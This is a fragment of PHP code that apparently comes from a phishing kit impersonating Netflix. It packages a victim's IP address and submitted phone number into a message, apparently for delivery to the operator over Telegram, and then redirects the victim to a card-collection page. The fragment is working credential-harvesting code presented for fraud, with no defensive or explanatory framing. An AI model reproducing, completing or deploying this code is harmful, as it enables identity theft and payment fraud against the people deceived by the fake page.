...
# Logs
# Logs
#$subject .= "💰💰==== N3TFLIX INFO FROM {$IP} ====💰💰\n\n";


$msgtg = '
💰💰==== N3TFLIX INFO FROM {'.$IP.'} ====💰💰

*👤Phone No * : `'.$_POST['phonenum'].'`
...
header('Location: ../card.php?q=netflix&client=firefox-b-d&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiQkrCQ993-AhUwhf0HHfm6BXUQ_AUoA3oECAEQBQ&biw=1366&bih=607&dpr=1#imgrc=k_nKE7nZ6YAIsM');
}
?>